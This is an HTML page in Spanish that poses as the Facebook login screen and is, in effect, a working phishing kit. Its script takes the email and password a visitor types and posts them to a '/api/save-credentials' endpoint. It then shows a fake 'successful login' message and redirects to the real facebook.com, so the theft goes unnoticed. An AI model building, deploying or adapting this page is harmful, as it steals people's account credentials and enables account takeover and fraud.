<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Inicia sesión o regístrate</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #f0f2f5;
            color: #1c1e21;
            line-height: 1.34;
        }
        
        .container {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding: 20px;
        }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 0;
        }
        
        .logo {
            font-size: 28px;
            font-weight: bold;
            color: #1877f2;
        }
        
        .login-form {
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
            padding: 20px;
            max-width: 396px;
            width: 100%;
            margin: 40px auto;
        }
        
        .login-form input {
            width: 100%;
            padding: 14px 16px;
            margin-bottom: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 17px;
        }
        
        .login-form input:focus {
            outline: none;
            border-color: #1877f2;
            box-shadow: 0 0 0 2px #e7f3ff;
        }
        
        .login-btn {
            background-color: #1877f2;
            border: none;
            border-radius: 6px;
            font-size: 20px;
            line-height: 48px;
            padding: 0 16px;
            width: 100%;
            color: white;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 16px;
        }
        
        .login-btn:hover {
            background-color: #166fe5;
        }
        
        .forgot-password {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .forgot-password a {
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
        }
        
        .forgot-password a:hover {
            text-decoration: underline;
        }
        
        .divider {
            align-items: center;
            border-bottom: 1px solid #dadde1;
            display: flex;
            margin: 20px 0;
        }
        
        .create-account-btn {
            background-color: #42b72a;
            border: none;
            border-radius: 6px;
            font-size: 17px;
            line-height: 48px;
            padding: 0 16px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            display: block;
            margin: 0 auto;
        }
        
        .create-account-btn:hover {
            background-color: #36a420;
        }
        
        .create-page {
            text-align: center;
            margin-top: 28px;
            font-size: 14px;
        }
        
        .create-page a {
            color: #1c1e21;
            font-weight: bold;
            text-decoration: none;
        }
        
        .create-page a:hover {
            text-decoration: underline;
        }
        
        .footer {
            margin-top: auto;
            padding-top: 20px;
            color: #737373;
            font-size: 14px;
            line-height: 1.34;
        }
        
        .footer-links {
            display: flex;
            flex-wrap: wrap;
            margin-bottom: 8px;
        }
        
        .footer-links a {
            color: #737373;
            margin-right: 20px;
            text-decoration: none;
        }
        
        .footer-links a:hover {
            text-decoration: underline;
        }
        
        .copyright {
            margin-top: 20px;
        }
        
        .language-selector {
            margin-top: 20px;
        }
        
        .language-selector select {
            padding: 5px;
            border: 1px solid #dddfe2;
            border-radius: 4px;
            background-color: white;
        }
        
        .message {
            padding: 10px;
            margin: 10px 0;
            border-radius: 4px;
            text-align: center;
            display: none;
        }
        
        .success {
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        @media (max-width: 900px) {
            .container {
                padding: 10px;
            }
            
            .login-form {
                margin: 20px auto;
            }
            
            .admin-panel {
                margin: 10px auto;
                overflow-x: auto;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">facebook</div>
            <div class="language-selector">
                
            </div>
        </div>
        
        <div class="login-form">
            <div id="message" class="message"></div>
            <form id="loginForm">
                <input type="text" id="email" placeholder="Correo electrónico o número de teléfono" required>
                <input type="password" id="password" placeholder="Contraseña" required>
                <button type="submit" class="login-btn">Iniciar sesión</button>
            </form>
            
            <div class="forgot-password">
                <a href="#">¿Olvidaste tu contraseña?</a>
            </div>
            
            <div class="divider"></div>
            
            <button class="create-account-btn" id="createAccount">Crear cuenta nueva</button>
            
            <div class="create-page">
                <a href="#">Crea una página</a> para una celebridad, una marca o un negocio.
            </div>
        </div>
        
        
        <div class="footer">
            <div class="copyright">
                Meta © 2025
            </div>
            
        </div>

    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const loginForm = document.getElementById('loginForm');
            const messageDiv = document.getElementById('message');
            
            const redirectURL = 'https://www.facebook.com/'; // Cambia esto a la URL que desees

            loginForm.addEventListener('submit', async function(e) {
                e.preventDefault();

                const email = document.getElementById('email').value;
                const password = document.getElementById('password').value;

                if (!email || !password) {
                    showMessage('Por favor, completa todos los campos.', 'error');
                    return;
                }

                try {
                    const response = await fetch('/api/save-credentials', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ email, password }),
                    });

                    const result = await response.json();

                    if (!response.ok) {
                        throw new Error(result.message);
                    }

                    showMessage('¡Inicio de sesión exitoso! Redirigiendo...', 'success');
                    
                    setTimeout(() => {
                        window.location.href = redirectURL;
                    }, 1500);

                } catch (error) {
                    console.error('Error:', error);
                    showMessage(`Error: ${error.message}`, 'error');
                }

                loginForm.reset();
            });

            function showMessage(text, type) {
                messageDiv.textContent = text;
                messageDiv.className = 'message ' + type;
                messageDiv.style.display = 'block';

                setTimeout(function() {
                    messageDiv.style.display = 'none';
                }, 5000);
            }
        });
    </script>
</body>
</html>
